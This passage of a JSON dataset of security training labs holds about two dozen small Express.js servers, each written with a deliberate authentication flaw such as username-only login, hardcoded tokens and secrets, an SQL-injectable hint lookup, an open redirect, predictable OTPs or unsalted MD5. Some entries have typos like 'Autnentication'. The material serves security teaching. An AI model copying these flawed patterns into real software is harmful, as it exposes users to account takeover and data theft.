      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: social login trusts only the provided username\napp.post('/socialAuth', (req, res) => {\n  const { username } = req.body;\n  if (username) {\n    res.send(`Logged in as ${username}`);\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Multi-tenant admin token exposure via shared cache",
      "labDescription": "In a multi-tenant environment, admin tokens are stored in a shared cache without proper isolation. This can allow an attacker from one tenant to retrieve the admin token of another.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: shared token cache without isolation\nlet tokenCache = {\n  'adminToken': 'admin123'\n};\n\napp.get('/getAdminToken', (req, res) => {\n  res.send(tokenCache.adminToken);\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Missing CAPTCHA on password reset",
      "labDescription": "The password reset endpoint lacks CAPTCHA verification, allowing attackers to automate reset requests and potentially abuse the password reset functionality.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: no CAPTCHA implemented on password reset\napp.post('/reset', (req, res) => {\n  const { email, newPassword } = req.body;\n  res.send(`Password for ${email} reset to ${newPassword}`);\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Device Autnenticationusing unsanitized MAC address",
      "labDescription": "A device Autnenticationendpoint uses the MAC address provided by the client without proper sanitization, allowing attackers to spoof the MAC address and gain unauthorized access.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: relies solely on client-supplied MAC address\napp.post('/deviceAuth', (req, res) => {\n  const mac = req.body.mac;\n  if (mac === '00:11:22:33:44:55') {\n    res.send('Device authenticated');\n  } else {\n    res.send('Autnenticationfailed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Open redirect in login confirmation",
      "labDescription": "After a successful login, the system redirects the user based on a URL provided in the request without validation, allowing attackers to redirect users to malicious sites.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: redirect URL taken directly from user input\napp.post('/loginConfirm', (req, res) => {\n  const { username, redirectUrl } = req.body;\n  if (username === 'user1') {\n    res.redirect(redirectUrl);\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Insecure password hint disclosure",
      "labDescription": "A password hint endpoint returns stored hints without proper access control, which can help attackers in guessing user passwords.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, hint TEXT)\");\n  db.run(\"INSERT INTO users (username, hint) VALUES ('user1', 'Your pet\\'s name')\");\n});\n\napp.get('/getHint', (req, res) => {\n  const username = req.query.username;\n  const query = `SELECT hint FROM users WHERE username = '${username}'`;\n  db.get(query, [], (err, row) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send(row ? row.hint : 'No hint available');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Default API endpoint without authentication",
      "labDescription": "An internal API endpoint does not enforce any authentication, allowing attackers to access sensitive data by simply calling the endpoint.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: no Autnenticationenforced on this endpoint\napp.get('/internalData', (req, res) => {\n  res.send('Sensitive internal data');\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Insecure OAuth state parameter handling",
      "labDescription": "An OAuth callback endpoint fails to validate the 'state' parameter, making it vulnerable to CSRF and token forgery attacks.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: missing validation of the state parameter\napp.post('/oauth/callback', (req, res) => {\n  const { token, state } = req.body;\n  if (token && state) {\n    res.send('OAuth callback accepted');\n  } else {\n    res.send('OAuth callback failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Unencrypted internal communication for authentication",
      "labDescription": "An internal AutnenticationAPI runs over plain HTTP without TLS, exposing sensitive credentials to interception and man-in-the-middle attacks.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Note: This server runs over HTTP, not HTTPS\napp.post('/internalAuth', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    res.send('Internal Autnenticationsuccessful');\n  } else {\n    res.send('Autnenticationfailed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Insecure session cookie path configuration",
      "labDescription": "Session cookies are configured with an overly broad path, making them accessible across multiple applications and vulnerable to cross-application attacks.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\n\n// Vulnerable: cookie path set too broadly\napp.use(session({\n  secret: 'broadSecret',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { path: '/', secure: false }\n}));\n\napp.post('/login', (req, res) => {\n  req.session.user = req.body.username;\n  res.send('Login successful');\n});\n\napp.get('/dashboard', (req, res) => {\n  if (req.session.user) res.send(`Welcome, ${req.session.user}`);\n  else res.send('Not authenticated');\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  {
      "labScenario": "Autnenticationbypass via insecure logout with cache retention",
      "labDescription": "The logout endpoint does not clear cached session data properly, leaving the session token valid so that an attacker can reuse it to access protected resources.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\napp.use(session({ secret: 'secret', resave: false, saveUninitialized: true }));\n\n// Vulnerable: logout does not destroy session data\napp.post('/logout', (req, res) => {\n  // Missing req.session.destroy()\n  res.send('Logged out');\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
  },
  
      {
          "labScenario": "Password update without current password verification",
          "labDescription": "The password update endpoint allows users to change their password without verifying the current password. An attacker with access to an active session can update the password without knowing the existing one.",
          "vulnerabilityName": "Authentication",
          "labLevel": "medium",
          "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable endpoint: no current password check\napp.post('/updatePassword', (req, res) => {\n  const { username, newPassword } = req.body;\n  // Insecurely updates the password without verifying the current one\n  res.send(`Password for ${username} updated to ${newPassword}`);\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
      },
      {
          "labScenario": "Login bypass due to missing rate limiting",
          "labDescription": "The login endpoint does not enforce rate limiting, making it vulnerable to brute-force attacks. An attacker can attempt many login requests without delay.",
          "vulnerabilityName": "Authentication",
          "labLevel": "easy",
          "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: No rate limiting implemented\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
      },
      {
          "labScenario": "Default fallback account on failed login",
          "labDescription": "If a user provides incorrect credentials, the system automatically logs them in as a default account instead of denying access. This fallback can be exploited by attackers.",
          "vulnerabilityName": "Authentication",
          "labLevel": "easy",
          "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: fallback to a default 'guest' account on failure\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    res.send('Login successful');\n  } else {\n    res.send('Logged in as guest');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
      },
      {
          "labScenario": "Misconfigured third-party OAuth callback",
          "labDescription": "The OAuth callback endpoint does not validate the state parameter or callback URL properly, enabling attackers to forge the callback and bypass authentication.",
          "vulnerabilityName": "Authentication",
          "labLevel": "hard",
          "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: OAuth callback with no state validation\napp.post('/oauth/callback', (req, res) => {\n  const { token, callbackUrl } = req.body;\n  if (token) {\n    res.redirect(callbackUrl);\n  } else {\n    res.send('OAuth login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
      },
      {
          "labScenario": "Predictable OTP generation for mobile authentication",
          "labDescription": "The OTP generation endpoint creates one-time passwords using a predictable algorithm based solely on the current time, making it easy for attackers to guess the OTP.",
          "vulnerabilityName": "Authentication",
          "labLevel": "hard",
          "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: OTP generated predictably from the current time\napp.post('/generateOTP', (req, res) => {\n  const otp = (Date.now() % 10000).toString().padStart(4, '0');\n  res.send({ otp });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
      },
      {
          "labScenario": "Weak password hashing using unsalted MD5",
          "labDescription": "During registration, passwords are hashed using unsalted MD5, which is cryptographically weak and vulnerable to rainbow table attacks.",
          "vulnerabilityName": "Authentication",
          "labLevel": "hard",
          "srcCode": "const express = require('express');\nconst crypto = require('crypto');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: using MD5 without a salt\napp.post('/register', (req, res) => {\n  const { username, password } = req.body;\n  const hashedPassword = crypto.createHash('md5').update(password).digest('hex');\n  res.send(`User ${username} registered with hash ${hashedPassword}`);\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
      },
      {
          "labScenario": "Flawed MFA fallback to insecure security questions",
          "labDescription": "The multi-factor Autnenticationsystem falls back to a security question when the primary factor fails. The fallback question is poorly implemented, allowing attackers to bypass MFA by guessing the answer.",
          "vulnerabilityName": "Authentication",
          "labLevel": "medium",
          "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: insecure fallback using a static answer\napp.post('/mfa', (req, res) => {\n  const { username, password, securityAnswer } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    res.send('MFA successful');\n  } else if (securityAnswer === 'blue') {\n    res.send('MFA bypassed');\n  } else {\n    res.send('MFA failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
      },
      {
          "labScenario": "Insecure session token storage with weak token generation",
          "labDescription": "The login endpoint generates session tokens by simply concatenating a username with a constant string, making the tokens predictable and vulnerable to hijacking.",
          "vulnerabilityName": "Authentication",
          "labLevel": "hard",
          "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: static token generation\nlet sessions = {};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    const token = username + '123';\n    sessions[token] = { username };\n    res.send({ token });\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.get('/profile', (req, res) => {\n  const token = req.headers.authorization;\n  if (sessions[token]) res.send(`Welcome, ${sessions[token].username}`);\n  else res.send('Invalid session');\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
      },
      {
          "labScenario": "Autnenticationbypass due to exposed debug mode",
          "labDescription": "When the server is running in debug mode, the login endpoint bypasses authentication, automatically logging in any user. This debug configuration should never be enabled in production.",
          "vulnerabilityName": "Authentication",
          "labLevel": "easy",
          "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: debug mode enabled\nconst DEBUG_MODE = true;\n\napp.post('/login', (req, res) => {\n  const { username } = req.body;\n  if (DEBUG_MODE) {\n    res.send(`Debug mode: ${username} logged in automatically`);\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
      },
      {
          "labScenario": "Reused static token across sessions",
          "labDescription": "The Autnenticationsystem always returns the same static token upon successful login, allowing attackers to reuse it indefinitely to access protected resources.",
          "vulnerabilityName": "Authentication",
          "labLevel": "hard",
          "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable: static token for every login\nconst STATIC_TOKEN = 'staticToken123';\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    res.send({ token: STATIC_TOKEN });\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.get('/dashboard', (req, res) => {\n  const token = req.headers.authorization;\n  if (token === STATIC_TOKEN) res.send('Dashboard accessed');\n  else res.send('Invalid token');\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
      },
      {
          "labScenario": "Missing CSRF protection on login endpoint",
          "labDescription": "The login endpoint does not implement CSRF protection, allowing an attacker to trick a user into submitting unauthorized login requests.",
          "vulnerabilityName": "Authentication",
          "labLevel": "medium",
          "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: no CSRF tokens or protection\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
      },
      {
          "labScenario": "Insecure API client secret handling",
          "labDescription": "The API Autnenticationendpoint relies on a hardcoded client secret that is exposed in the source code, enabling attackers to bypass client authentication.",
          "vulnerabilityName": "Authentication",
          "labLevel": "hard",
          "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\nconst CLIENT_SECRET = 'exposedClientSecret';\n\napp.post('/apiLogin', (req, res) => {\n  const { clientId, clientSecret } = req.body;\n  // Vulnerable: hardcoded client secret check\n  if (clientSecret === CLIENT_SECRET) {\n    res.send('API login successful');\n  } else {\n    res.send('API login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
      },
      {
          "labScenario": "LDAP integration with insecure verification (simulated)",
          "labDescription": "A simulated LDAP login endpoint improperly verifies credentials by accepting any non-empty username, bypassing proper Autnenticationlogic.",
          "vulnerabilityName": "Authentication",
          "labLevel": "medium",
          "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: simulated LDAP login that ignores the password\napp.post('/ldapLogin', (req, res) => {\n  const { username, password } = req.body;\n  if (username) {\n    res.send('LDAP login successful');\n  } else {\n    res.send('LDAP login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
      },
      {
          "labScenario": "Missing account lockout mechanism on repeated login failures",
          "labDescription": "The login endpoint does not lock out an account after repeated failed attempts, making it vulnerable to brute-force attacks.",
          "vulnerabilityName": "Autnentication",
          "labLevel": "medium",
          "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\n\n// Vulnerable: No account lockout mechanism\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user1' && password === 'pass1') {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
      },
      {
          "labScenario": "Insecure logout process without session destruction",
          "labDescription": "The logout endpoint does not properly destroy the session, leaving the session ID valid and allowing attackers to reuse it for unauthorized access.",
          "vulnerabilityName": "Authentication",
          "labLevel": "hard",
          "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.json());\napp.use(session({ secret: 'secret', resave: false, saveUninitialized: true }));\n\napp.post('/login', (req, res) => {\n  req.session.user = req.body.username;\n  res.send('Login successful');\n});\n\n// Vulnerable: logout does not destroy the session\napp.post('/logout', (req, res) => {\n  res.send('Logged out');\n});\n\napp.get('/dashboard', (req, res) => {\n  if (req.session.user) res.send(`Welcome, ${req.session.user}`);\n  else res.send('Please log in');\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
      }
  
]